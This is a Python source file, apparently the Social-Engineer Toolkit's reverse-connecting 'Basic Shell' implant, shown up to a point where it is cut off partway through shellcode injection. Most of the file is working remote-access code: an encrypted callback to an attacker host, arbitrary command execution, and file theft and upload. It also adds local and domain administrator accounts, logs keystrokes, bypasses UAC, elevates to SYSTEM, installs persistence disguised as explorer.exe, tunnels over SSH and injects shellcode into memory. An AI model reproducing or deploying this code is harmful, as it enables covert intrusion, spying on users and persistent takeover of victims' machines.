#!/usr/bin/env python
from socket import *
import subprocess
import sys
import os
import base64
import binascii
import threading
import select
import thread
import time
import random
import string
import sys
import logging
import paramiko
import tempfile
import ctypes

# detect if we're on windows
if os.name == "nt":
    operating_system = "windows"
    import win32process
    import win32api
    import win32con
    import pythoncom
    import pyHook
    import win32security
    from ntsecuritycon import *

# detect if we're on nix
if os.name == "posix":
    operating_system = "posix"

##########################################################################
#
# win32process is a third party module, will need to include it, download the windows binaries, be sure to use
# python 2.5, pyinstaller doesn't like anything above it for the byte compiling.
#
# Note to get pyinstaller to work it was compiled under Python 2.5, be sure to install things manually and
# not through Activestate.
#
# Download win32 modules needed for shell here:
# http://sourceforge.net/projects/pywin32/files/pywin32/Build216/pywin32-216.win32-py2.5.exe/download
#
# You will also need pyCrypto, it's a pain to install if you do it from source, should get the binary modules
# to make it easier. Can download from here:
# http://www.voidspace.org.uk/cgi-bin/voidspace/downman.py?file=pycrypto-2.0.1.win32-py2.5.zip
#
# Will need to download pyHooks from:
# http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/pyHook-1.5.1.win32-py2.5.exe/download
#
# Be sure to pack it via UPX first in order for the UPX encoding to work properly within SET.
#
##########################################################################
#
#
##########################################################################
#
# Below is the steps used to compile the binary. py2exe requires a dll to be used in conjunction
# so py2exe was not used. Instead, pyinstaller was used in order to byte compile the binary.
#
# Remember to use Python 2.5 for Windows, nothing above and don't use ActiveState, things break.
#
##########################################################################
#
#
##########################################################################
#
# For OSX installation, install ActiveState Python 2.7 and type:
#
# sudo pypm install paramiko
#
# You will then need to go into Configure.py in pyinstaller and look for "64bit". Change it to
# something garbage like  dsifsdfidsfdshfois. This is a bug if it detects OSX in 64bit it will
# completely bomb. We fix it with the export VERSIONER below but it was still causing issues.
# Changing the 64bit thing will fix it completely.
#
# You will also need to edit Build.py, search for return '64bit' and change to return '32bit'.
# Another bug for detection.
#
# Then create a bash script and run the below from the command line:
#
# export VERSIONER_PYTHON_PREFER_32_BIT=yes
# python Configure.py
# python Makespec.py --onefile --noconsole shell.py
# python Build.py shell/shell.spec
#
#
# This will allow you to compile the shell via pyinstaller for OSX
#
# On LINUX it's easy just use pyinstaller ensure paramiko is installed
#
##########################################################################
#
#
##########################################################################
#
# download pyinstaller from: http://www.pyinstaller.org/
#
# Make sure your using python2.5, anything above gets buggy.
#
# Make sure you have win32api, paramiko, pycrypto python modules installed
#
# Ensure to install pyinstaller 1.4, 1.5 is buggy.
#
# Unzip: and run the following commands on the shell.py file
#
# python Configure.py
# python Makespec.py --onefile --noconsole shell.py
# python Build.py shell\shell.spec
#
##########################################################################

verbose = True

# random value here to randomize builds
a = 50 * 5

# try block here
try:
    # check for an ip address file if we aren't feeding it
    temp = tempfile.gettempdir()  # prints the current temporary directory
    if os.path.isfile(temp + "/42logfile42.tmp"):
        fileopen = open(temp + "/42logfile42.tmp", "r")
        data = fileopen.read()
        data = data.split(" ")
        ipaddr = data[0]
        port = data[1]
        try:
            os.remove(temp + "/42logfile42.tmp")
        except:
            pass
        # create a socket object
        sockobj = socket(AF_INET, SOCK_STREAM)
        # parse the textfile
        sockobj.connect((ipaddr, int(port)))

    if not os.path.isfile(temp + "/42logfile42.tmp"):
        # create a socket object
        sockobj = socket(AF_INET, SOCK_STREAM)
        # parse command line arguments one and two. First is IP, second is port
        sockobj.connect((sys.argv[1], int(sys.argv[2])))

# except index error which means user didn't specify IP and port
except IndexError:
    # send error message
    # if verbose == True:
    print("\nThe Social-Engineer Toolkit Basic Shell\n\nSyntax: shell.exe <ipaddress> <port>")
    # exit the program
    sys.exit()

# except Exception
except Exception as e:
    if verbose == True:
        print(e)

    # sleep 10 seconds and try to connect again
    try:
        time.sleep(10)
        # create a socket object
        sockobj = socket(AF_INET, SOCK_STREAM)

        # parse command line arguments one and two. First is IP, second is port
        sockobj.connect((sys.argv[1], int(sys.argv[2])))

        # wait 10 more and try again
        time.sleep(10)

        # create a socket object
        sockobj = socket(AF_INET, SOCK_STREAM)

        # parse command line arguments one and two. First is IP, second is port
        sockobj.connect((sys.argv[1], int(sys.argv[2])))

    # if not give up
    except Exception as e:
        if verbose == True:
            print(e)
        sys.exit()

# tell SET we are the interactive shell
# if we're nix
if operating_system == "windows":
    send_string = "IHAYYYYYIAMSETANDIAMWINDOWS"
# if we're nix
if operating_system == "posix":
    send_string = "IHAYYYYYIAMSETANDIAMPOSIXXX"
sockobj.send(send_string)

# generate random strings


def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen = random_string()
    return rand_gen

# this is what we use to either encrypt or not encrypt


def send_packet(message, sockobj, encryption, cipher):

    # if we encrypt or not
    if encryption == 1:

        # we encrypt our output here
        encoded = EncodeAES(cipher, message)
        # we take the length of the encrypted string
        normal_size = len(encoded)
        # we turn the length of our string into a string literal
        normal_size = str(normal_size)
        # we encrypt our string literal
        normal_size_crypt = EncodeAES(cipher, normal_size)
        # we send our encrypted string literal to let our server know how long our
        # true encrypted string is
        sockobj.sendall(normal_size_crypt)
        # we send our encrypted string
        time.sleep(0.5)
        sockobj.sendall(encoded)

    # if 0 then don't encrypt
    if encryption == 0:
        normal_size = str(len(message))
        message = str(message)
        sockobj.send(normal_size)
        sockobj.send(str(message))

# decrypt packet routine


def decrypt_packet(message, encryption, cipher):

    # if we support encryption
    if encryption == 1:
        return DecodeAES(cipher, message)

    # if we don't support encryption
    if encryption == 0:

        return message

# receive file from the attacker machine


def upload_file(filename):

    # define data as a received information from attacker machine
    data = sockobj.recv(1024)

    # decrypt the packet which will tell us length to be sent
    data = decrypt_packet(data, encryption, cipher)

    # this will be our encrypted filepath
    data = sockobj.recv(1024)

    # decrypted file path, not needed here
    data = decrypt_packet(data, encryption, cipher)

    # specify file to write
    filewrite = open(filename, "wb")

    # this will be our length for our file
    data = sockobj.recv(1024)

    # decrypt the length of our file
    data = decrypt_packet(data, encryption, cipher)

    # here is an ugly hack but it works, basically we set two
    # counters. MSGLEN which will eventually equal the length
    # of what number was sent to us which represented the length
    # of the output of the shell command we executed. Dataout
    # will eventually equal the entire string loaded into our
    # buffer then sent for decryption.
    #
    # A loop is started which continues to receive until we hit
    # the length of what our entire full encrypted shell output
    # is equaled. Once that occurs, we are out of our loop and
    # the full string is sent to the decryption routine and
    # presented back to us.

    MSGLEN = 0
    dataout = ""
    length = int(data)
    while MSGLEN != length:
        data = sockobj.recv(1024)
        dataout += data
        MSGLEN = MSGLEN + len(data)

    data = decrypt_packet(dataout, encryption, cipher)
    filewrite.write(data)

    # close file after write
    filewrite.close()

    # confirm its there
    if os.path.isfile(filename):
        send_packet("Confirmed", sockobj, encryption, cipher)

    # if its not then send back failed
    if not os.path.isfile(filename):
        send_packet("Failed", sockobj, encryption, cipher)

# Note that this module does not come with pre-build binaries you will need either a compiler installed
# on your Windows machine or download the binary blobs from here:
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

from Crypto.Cipher import AES

# set encryption key to 1
encryption = 1

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# random value here to randomize builds
a = 50 * 5

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

#############################################
#
#     Reboot Server Code through Native
#     API.
#
#############################################


def AdjustPrivilege(priv, enable=1):
    # Get the process token
    flags = TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    htoken = win32security.OpenProcessToken(
        win32api.GetCurrentProcess(), flags)
    # Get the ID for the system shutdown privilege.
    idd = win32security.LookupPrivilegeValue(None, priv)
    # Now obtain the privilege for this process.
    # Create a list of the privileges to be added.
    if enable:
        newPrivileges = [(idd, SE_PRIVILEGE_ENABLED)]
    else:
        newPrivileges = [(idd, 0)]
    # and make the adjustment
    win32security.AdjustTokenPrivileges(htoken, 0, newPrivileges)


def RebootServer(message='Rebooting', timeout=0, bForce=0, bReboot=1):
    AdjustPrivilege(SE_SHUTDOWN_NAME)
    try:
        win32api.InitiateSystemShutdown(
            None, message, timeout, bForce, bReboot)
    finally:
        # Now we remove the privilege we just added.
        AdjustPrivilege(SE_SHUTDOWN_NAME, 0)


def AbortReboot():
    AdjustPrivilege(SE_SHUTDOWN_NAME)
    try:
        win32api.AbortSystemShutdown(None)
    finally:
        AdjustPrivilege(SE_SHUTDOWN_NAME, 0)


########################################
#
#     Start Paramiko Code here
#
########################################

def handler(chan, host, port):
    sock = socket()
    try:
        sock.connect((host, port))

    except Exception as e:
        if verbose == True:
            print(e)
        return

    while True:
        r, w, x = select.select([sock, chan], [], [])
        if sock in r:
            data = sock.recv(1024)
            if len(data) == 0:
                break
            chan.send(data)
        if chan in r:
            data = chan.recv(1024)
            if len(data) == 0:
                break
            sock.send(data)
    chan.close()
    sock.close()

# here is where we start the transport request for port forward on victim
# then tunnel over via thread and handler


def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):

    transport.request_port_forward('', server_port)
    # while we accept transport via thread handler continue loop
    while True:
        chan = transport.accept(1000)
        if chan is None:
            continue
        # define thread
        thr = threading.Thread(target=handler, args=(
            chan, remote_host, remote_port))
        # set thread as daemon
        thr.setDaemon(True)
        # start thread
        thr.start()

########################################
#
#   End Paramiko Code here
#
########################################

# main outside loop for the shell
try:

    while 1:

        # second inside loop
        while 1:

            # receive socket connection from attacker
            data = sockobj.recv(1024)

            if data == "quit" or data == "":
                sys.exit()

            # if the length is 52 then we support encryption
            if len(data) == 52:
                encryption = 1
                sockobj.send(data)
                data = sockobj.recv(1024)
                data = binascii.unhexlify(data)
                secret = data
                cipher = AES.new(secret)
                break

            # if the length is 51 then we don't support encryption
            if len(data) == 51:
                # if we don't support encryption then break out
                cipher = ""
                sockobj.send(data)
                encryption = 0
                break

        # while true loop forever
        while 1:

            # define data as a received information from attacker machine
            data = sockobj.recv(1024)

            # decrypt the packet which will tell us length to be sent
            data = decrypt_packet(data, encryption, cipher)

            # leverage the previous data socket connection as our length for
            # our next socket
            data = sockobj.recv(int(data))

            # this will be our actual data packet
            data = decrypt_packet(data, encryption, cipher)

            # if data == quit or exit break out of main loop and renegotiate
            # encryption
            if data == "quit" or data == "exit":
                break

            # if the attacker specifies a command shell lets get it ready
            if data == "shell":
                # specify another while loop to put us into the subprocess
                # commands
                while 1:

                    # try block
                    try:

                        # define data as a received information from attacker
                        # machine
                        data = sockobj.recv(1024)

                        # decrypt the packet which will tell us length to be
                        # sent
                        data = decrypt_packet(data, encryption, cipher)

                        # leverage the previous data socket connection as our
                        # length for our next socket
                        data = sockobj.recv(int(data))

                        # this will be our actual data packet
                        data = decrypt_packet(data, encryption, cipher)
                        # if we receive data 'exit' then break out of the loop
                        # but keep socket alive
                        if data == "exit" or data == "quit":
                            data = ""
                            # break out of the loop
                            break

                        # note that you have to do some funky stuff with stdout, stderr, and stdin,
                        # when you use a non-console window subprocess bugs out (known since python
                        # 2.5.1). You need to pipe all the channels out to subprocess.PIPE then
                        # communicate with only stdout via proc.stdout.read() if not you will get a
                        # major error when running the shell.

                        # send our command that would be 'data'
                        proc = subprocess.Popen(
                            data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                        # communicate with stdout and send it back to attacker
                        stdout_value = proc.stdout.read()

                        # if we have an error just append to nothing if needed
                        stdout_value += proc.stderr.read()

                        # do the actual send
                        send_packet(str(stdout_value) + "\r\n",
                                    sockobj, encryption, cipher)

                    # except a keyboard interrupt shouldn't actually hit this
                    # since we are using commands from attacker
                    except KeyboardInterrupt:

                        # close socket
                        sockobj.close()

                        # exit
                        sys.exit()

                    # except all other errors
                    except Exception as e:
                        if verbose == True:
                            print(e)
                        # pass through them
                        pass

            # this section adds a local admin on the local system
            if data == "localadmin":
                try:

                    # define data as a received information from attacker
                    # machine
                    data = sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data = decrypt_packet(data, encryption, cipher)

                    # leverage the previous data socket connection as our
                    # length for our next socket
                    data = sockobj.recv(int(data))

                    # this will be our actual data packet
                    data = decrypt_packet(data, encryption, cipher)

                    # split the data sent, should be seperated by a command ","
                    # which splits into a tuple
                    data = data.split(",")

                    # this initiates subprocess.Popen as a shell command and
                    # uses net user to add a local user account initally
                    # locally
                    proc = subprocess.Popen("net user %s %s /ADD" % (data[0], data[
                                            1]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).wait()

                    # this initiates subprocess.Popen as a shell command and
                    # uses net localgroup to add a local administrator
                    proc = subprocess.Popen("net localgroup administrators %s /ADD" % (
                        data[0]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).wait()

                # except exception
                except Exception as e:
                    if verbose == True:
                        print(e)
                    pass

            # this section adds a domain admin on the local system
            if data == "domainadmin":
                try:

                    # define data as a received information from attacker
                    # machine
                    data = sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data = decrypt_packet(data, encryption, cipher)

                    # leverage the previous data socket connection as our
                    # length for our next socket
                    data = sockobj.recv(int(data))

                    # this will be our actual data packet
                    data = decrypt_packet(data, encryption, cipher)

                    # split the data sent, should be seperated by a command ","
                    # which splits into a tuple
                    data = data.split(",")

                    # this initiates subprocess.Popen as a shell command and
                    # uses net user to add a domain user account initially
                    proc = subprocess.Popen("net user %s %s /ADD /DOMAIN" % (data[0], data[
                                            1]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).wait()

                    # this initiates subprocess.Popen as a shell command and
                    # uses net group to add to domain admins
                    proc = subprocess.Popen('net group "Domain Admins" %s /ADD /DOMAIN' % (
                        data[0]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).wait()

                # except errors and don't pass them yet, will add to logging
                # later
                except Exception as e:
                    if verbose == True:
                        print(e)
                    pass

            # this section is if the attacker wants to download a file
            if data == "downloadfile":
                try:

                    # define data as a received information from attacker
                    # machine
                    data = sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data = decrypt_packet(data, encryption, cipher)

                    # leverage the previous data socket connection as our length for our next socket
                    # data=sockobj.recv(int(data))

                    data = sockobj.recv(1024)

                    # this will be our actual data packet
                    download = decrypt_packet(data, encryption, cipher)

                    # if the file isn't there let the listener know
                    if not os.path.isfile(download):
                        # send that the file isn't found
                        send_packet("File not found.", sockobj,
                                    encryption, cipher)

                    # if the file is there then cycle through it and let the
                    # listener know
                    if os.path.isfile(download):
                        # open the file for read/binary
                        fileopen = open(download, "rb")
                        data_file = ""
                        # while data send socket per line
                        for data in fileopen:
                            data_file += data
                        send_packet(data_file, sockobj, encryption, cipher)

                # except exception
                except Exception as e:
                    if verbose == True:
                        print(e)
                    pass

            # this section is if the attacker wants to upload a file
            if data == "uploadfile":
                # try block
                try:

                    # define data as a received information from attacker
                    # machine
                    data = sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data = decrypt_packet(data, encryption, cipher)

                    # this will be our encrypted filepath
                    data = sockobj.recv(1024)

                    # decrypted file path
                    data = decrypt_packet(data, encryption, cipher)

                    upload_path = data

                    # specify file to write
                    filewrite = open(upload_path, "wb")

                    # this will be our length for our file
                    data = sockobj.recv(1024)

                    # decrypt the length of our file
                    data = decrypt_packet(data, encryption, cipher)

                    # here is an ugly hack but it works, basically we set two
                    # counters. MSGLEN which will eventually equal the length
                    # of what number was sent to us which represented the length
                    # of the output of the shell command we executed. Dataout
                    # will eventually equal the entire string loaded into our
                    # buffer then sent for decryption.
                    #
                    # A loop is started which continues to receive until we hit
                    # the length of what our entire full encrypted shell output
                    # is equaled. Once that occurs, we are out of our loop and
                    # the full string is sent to the decryption routine and
                    # presented back to us.

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = sockobj.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data = decrypt_packet(dataout, encryption, cipher)
                    filewrite.write(data)

                    # close file after write
                    filewrite.close()

                    # confirm its there
                    if os.path.isfile(upload_path):
                        send_packet("Confirmed", sockobj, encryption, cipher)

                    # if its not then send back failed
                    if not os.path.isfile(upload_path):
                        send_packet("Failed", sockobj, encryption, cipher)

                # handle error messages
                except Exception as e:
                    if verbose == True:
                        print(e)
                    pass

            # here is where we start our paramiko SSH tunneling
            if data == "paramiko":

                # start initial try block
                try:
                    # send to the server that we support paramiko
                    send_packet("Paramiko Confirmed.",
                                sockobj, encryption, cipher)

                    # receive all of our variables to establish tunnel
                    data = sockobj.recv(1024)
                    # decrypt the packet
                    data = decrypt_packet(data, encryption, cipher)

                    # receive all
                    data = sockobj.recv(int(data))
                    data = decrypt_packet(data, encryption, cipher)

                    # split into a tuple
                    data = data.split(",")

                    # IP of the SSH server
                    ssh_server_ip = data[0]
                    # PORT of the SSH server
                    ssh_server_port_address = data[1]
                    # PORT to use on localhost for tunneled protcol
                    ssh_server_tunnel_port = data[2]
                    # username for SSH server
                    ssh_server_username = data[3]
                    # password for SSH server
                    ssh_server_password = data[4]
                    # PORT to forward from victim
                    victim_server_port = data[5]
                    # specify data as ssh_port_tunnel

                    # main class here
                    def main(garbage_one, garbage_two, garbage_three):
                        # our ssh server
                        server = [ssh_server_ip, int(ssh_server_port_address)]
                        # what we want to tunnel
                        remote = ['127.0.0.1', int(victim_server_port)]
                        password = ssh_server_password  # our password
                        client = paramiko.SSHClient()  # use the paramiko SSHClient
                        client.load_system_host_keys()  # load SSH keys
                        client.set_missing_host_key_policy(
                            paramiko.AutoAddPolicy())  # automatically add SSH key

                        try:
                            client.connect(server[0], server[
                                           1], username=ssh_server_username, key_filename=None, look_for_keys=False, password=password)

                        # except exception
                        except Exception as e:
                            if verbose == True:
                                print('*** Failed to connect to %s:%d: %r' % (server[0], server[1], e))
                        try:
                            reverse_forward_tunnel(ssh_server_tunnel_port, remote[
                                                   0], remote[1], client.get_transport())

                        # except exception
                        except Exception as e:
                            if verbose == True:
                                print(e)

                    # have to pass some garbage to start thread
                    garbage_one = ""
                    garbage_two = ""
                    garbage_three = ""

                    # start a new thread to ensure that when we establish an SSH tunnel we can continue
                    # to leverage SET interactive shell.
                    # this starts the main routine which is where we get all
                    # our port forward stuff
                    thread.start_new_thread(
                        main, (garbage_one, garbage_two, garbage_three))

                # except exception
                except Exception as e:
                    if verbose == True:
                        print(e)

            # lock the workstation of victim
            if data == "lockworkstation":
                ctypes.windll.user32.LockWorkStation()

            # elevate permissions
            if data == "getsystem":
                try:
                    temp_path = os.getenv('TEMP')

                    # this is our shell exectuable
                    set_payload = temp_path + "\\" + \
                        generate_random_string(10, 15) + ".exe"

                    # accept the file and write it do disk as the set_payload
                    # variable
                    upload_file(set_payload)

                    # sleep 0.5 seconds
                    time.sleep(0.5)

                    # this will spawn the shell in a seperate process thread as
                    # SYSTEM
                    def getsystem(set_payload, ipaddr):
                        # generate a random string between 10 and 15 length
                        service_name = generate_random_string(10, 15)
                        # create a service
                        subprocess.Popen('sc create %s binpath= "cmd /c %s %s" type= own' %
                                         (service_name, set_payload, ipaddr), shell=True).wait()

                        # start the service, don't wait for it to finish
                        subprocess.Popen("sc start %s" %
                                         (service_name), shell=True)

                    # define data as a received information from attacker
                    # machine
                    data = sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data = decrypt_packet(data, encryption, cipher)

                    # this will be our ipaddress and port
                    data = sockobj.recv(1024)

                    # decrypted file path
                    data = decrypt_packet(data, encryption, cipher)

                    # this is our ipaddress and port
                    ipaddr = data

                    #
                    # start a new thread
                    #
                    thread.start_new_thread(getsystem, (set_payload, ipaddr))

                # handle error messages
                except Exception as e:
                    if verbose == True:
                        print(e)
                    pass

            # keystroke logging
            if data == "keystroke_start":

                # TEMP directory
                temp_path = os.getenv('TEMP')

                # this is the log file
                global logfile
                logfile = temp_path + "\\" + generate_random_string(10, 15)

                # trigger an event
                def OnKeyboardEvent(event):

                    filewrite = open(logfile, "a")
                    filewrite.write(chr(event.Ascii))
                    filewrite.close()
                    return True

                # start keystroke logging
                def start_keystroke(garbage1, garbage2, garbage3):

                    hm = pyHook.HookManager()
                    hm.KeyDown = OnKeyboardEvent
                    hm.HookKeyboard()
                    pythoncom.PumpMessages()

                # need to pass vars to meet threading requirements
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""

                # start the keystroke logger
                thread.start_new_thread(
                    start_keystroke, (garbage1, garbage2, garbage3))

            # dump keystrokes
            if data == "keystroke_dump":

                # set a flag to test if we ran keystroke_start first
                flag = 0
                # try to see if logfile is there
                try:
                    logfile
                except:
                    flag = 1

                # if we are all set
                if flag == 0:

                    # open the logfile
                    if os.path.isfile(logfile):
                        fileopen = open(logfile, "r")

                        # read all the data
                        data = fileopen.read()

                        # if we found nothing yet
                        if data == "":
                            data = "[!] There is no captured keystrokes yet."

                    if not os.path.isfile(logfile):
                        data = "[!] There is no captured keystrokes yet."

                    send_packet(data, sockobj, encryption, cipher)

                # if we didn't start the keystroke
                if flag == 1:
                    send_packet(
                        "[!] It doesn't appear keystroke_start is running, did you execute the command?", sockobj, encryption, cipher)

            # bypass windows uac
            if data == "bypassuac":
                # try block
                try:

                    # TEMP directory
                    temp_path = os.getenv('TEMP')

                    # this is our bypass uac executable
                    bypassuac = temp_path + "\\" + \
                        generate_random_string(10, 15) + ".exe"

                    # this is our actual SET payload to be executed with UAC
                    # safe stuff
                    set_payload = temp_path + "\\" + \
                        generate_random_string(10, 15) + ".exe"

                    # upload our files first is bypass uac
                    upload_file(bypassuac)

                    # sleep 0.5 seconds
                    time.sleep(0.5)

                    # set payload
                    upload_file(set_payload)

                    # this will spawn the shell in a seperate process thread
                    def launch_uac(bypassuac, set_payload, ipaddress):
                        subprocess.Popen(
                            "%s /c %s %s" % (bypassuac, set_payload, ipaddress), shell=True).wait()

                    # define data as a received information from attacker
                    # machine
                    data = sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data = decrypt_packet(data, encryption, cipher)

                    # this will be our ipaddress and port
                    data = sockobj.recv(1024)

                    # decrypted file path
                    data = decrypt_packet(data, encryption, cipher)

                    # this is our ipaddress and port
                    ipaddr = data

                    #
                    # start a new thread
                    #
                    thread.start_new_thread(
                        launch_uac, (bypassuac, set_payload, ipaddr))

                # handle error messages
                except Exception as e:
                    if verbose == True:
                        print(e)
                    pass

            # remov for SET
            if data == "removepersistence":
                # try block
                try:
                    # WINDIR directory
                    windir_path = os.getenv('WINDIR')
                    # this is our SET interactive service executable
                    # set_service = windir_path + "\\system32\\" + generate_random_string(10,15) + ".exe"
                    set_service = windir_path + "\\system32\\" + "explorer.exe"
                    subprocess.Popen("%s stop" % (
                        set_service), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    subprocess.Popen("%s remove" % (
                        set_service), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # handle error messages
                except Exception as e:
                    if verbose == True:
                        print(e)
                    pass

            # persistence for SET
            if data == "persistence":
                # try block
                try:

                    # WINDIR directory
                    windir_path = os.getenv('WINDIR')

                    # enumerate home directory
                    homedir_path = os.getenv("SystemDrive")
                    homedir_path = homedir_path + "\\Program Files\\Common Files\\"

                    # see if we are running vista/windows 7 (potential for UAC)
                    os_counter = 0

                    # see if its vista or windows 7
                    if os.path.isdir(homedir_path):
                        os_counter = 1
                        set_service = homedir_path + "explorer.exe"
                        set_shell = homedir_path + \
                            generate_random_string(10, 15) + ".exe"

                    # this is our SET interactive service executable
                    # if its at system32
                    if os_counter == 0:
                        if os.path.isdir("%s\\system32" % (windir_path)):
                            set_service = windir_path + "\\system32\\" + "explorer.exe"

                            # this is the SET interactive shell
                            set_shell = windir_path + "\\system32\\" + \
                                generate_random_string(10, 15) + ".exe"

                    # upload the persistence set interactive shell
                    upload_file(set_service)

                    # sleep 0.5 seconds
                    time.sleep(0.5)

                    # upload our SET interactive service
                    upload_file(set_shell)

                    # define data as a received information from attacker
                    # machine
                    data = sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data = decrypt_packet(data, encryption, cipher)

                    # this will be our ipaddress and port
                    data = sockobj.recv(1024)

                    # decrypted file path
                    data = decrypt_packet(data, encryption, cipher)

                    # this is our ipaddress and port
                    ipaddr = data
                    #ipaddr = set_shell + " " + ipaddr
                    if os_counter == 0:
                        filewrite = open("%s\\system32\\isjxwqjs" %
                                         (windir_path), "w")
                    if os_counter == 1:
                        filewrite = open("%sisjxwqjs" % (homedir_path), "w")
                    filewrite.write('"' + set_shell + '"' + " " + ipaddr)
                    filewrite.close()
                    time.sleep(2)
                    # automatically start service
                    subprocess.Popen('"%s" --startup auto install' % (set_service), shell=True,
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    time.sleep(5)
                    # start the service
                    subprocess.Popen('"%s" start' % (
                        set_service), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # handle error messages
                except Exception as e:
                    if verbose == True:
                        print(e)
                    pass

            # if the attacker specifies a command shell lets get it ready
            if data == "ps":
                try:
                    # if we're running windows then use win32process to
                    # enumerate
                    if operating_system == "windows":
                        processes = win32process.EnumProcesses()
                        data = ""
                        for pid in processes:
                            try:
                                handle = win32api.OpenProcess(
                                    win32con.PROCESS_ALL_ACCESS, False, pid)
                                exe = win32process.GetModuleFileNameEx(
                                    handle, 0)
                                data += exe + " PID:" + str(pid) + "\r\n"
                            except:
                                pass

                    # if we're running linux then run subprocess ps -aux to
                    # enumerate
                    if operating_system == "posix":

                        # send our command that would be 'data'
                        proc = subprocess.Popen(
                            "ps -ax", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                        # communicate with stdout and send it back to attacker
                        stdout_value = proc.stdout.read()

                        # if we have an error just append to nothing if needed
                        stdout_value += proc.stderr.read()

                        # send the data back
                        data = stdout_value

                    # send our data
                    send_packet(data, sockobj, encryption, cipher)

                except Exception as e:
                    if verbose == True:
                        print(e)

            # if we want to kill a process
            if data == "kill":
                try:
                    # recv initial length of next socket
                    data = sockobj.recv(1024)
                    data = decrypt_packet(data, encryption, cipher)
                    # this should be our pid to kill
                    data = sockobj.recv(int(data))
                    pid = decrypt_packet(data, encryption, cipher)

                    # if we're running windows then use win32api to kill and
                    # terminate process
                    if operating_system == "windows":
                        # specify handler as the process id received
                        handler = win32api.OpenProcess(
                            win32con.PROCESS_TERMINATE, 0, int(pid))
                        # kill the process through the win32api
                        # TerminatorProcess function call
                        win32api.TerminateProcess(handler, 0)

                    # if we're running linux then run kill -9
                    if operating_system == "posix":
                        subprocess.Popen("kill -9 %s" % (pid), shell=True)

                    data = "Confirmed kill"
                    # send our data
                    send_packet(data, sockobj, encryption, cipher)

                # except exception
                except Exception as e:
                    if verbose == True:
                        print(e)
                    sys.exit()

            # this is for rebooting the server
            if data == "reboot":
                try:
                    # if we're running windows then use win32process to
                    # enumerate
                    if operating_system == "windows":
                        RebootServer()
                        data = "[*] Server has been rebooted."

                    # if we're running linux then run subprocess ps -aux to
                    # enumerate
                    if operating_system == "posix":

                        # send our command that would be 'data'
                        proc = subprocess.Popen(
                            "reboot now", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                        # send the data back
                        data = "[*] Server has been rebooted."

                    # send our data
                    send_packet(data, sockobj, encryption, cipher)

                except Exception as e:
                    if verbose == True:
                        print(e)

            # this section is if the attacker wants to upload a file
            if data == "shellcode":
                # try block
                try:

                    # define data as a received information from attacker
                    # machine
                    data = sockobj.recv(1024)

                    # decrypt the packet which will tell us length to be sent
                    data = decrypt_packet(data, encryption, cipher)

                    # here is an ugly hack but it works, basically we set two
                    # counters. MSGLEN which will eventually equal the length
                    # of what number was sent to us which represented the length
                    # of the output of the shell command we executed. Dataout
                    # will eventually equal the entire string loaded into our
                    # buffer then sent for decryption.
                    #
                    # A loop is started which continues to receive until we hit
                    # the length of what our entire full encrypted shell output
                    # is equaled. Once that occurs, we are out of our loop and
                    # the full string is sent to the decryption routine and
                    # presented back to us.

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = sockobj.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data = decrypt_packet(dataout, encryption, cipher)

                    shellcode = bytearray("%s" % (data))

                    # awesome shellcode injection code
                    # http://www.debasish.in/2012/04/execute-shellcode-using-python.html
                    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                              ctypes.c_int(
                                                                  len(shellcode)),
                                                              ctypes.c_int(
                                                                  0x3000),
                                                              ctypes.c_int(0x40))

                    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                                       ctypes.c_int(len(shellcode)))

                    buf = (ctypes.c_char * len(shellcode)
                           ).from_buffer(shellcode)

                    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                                         buf,
                                                         ctypes.c_int(len(shellcode)))

                    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                             ctypes.c_int(0),
                                                             ctypes.c_int(ptr),
                                                             ctypes.c_int(0),
                                                             ctypes.c_int(0),
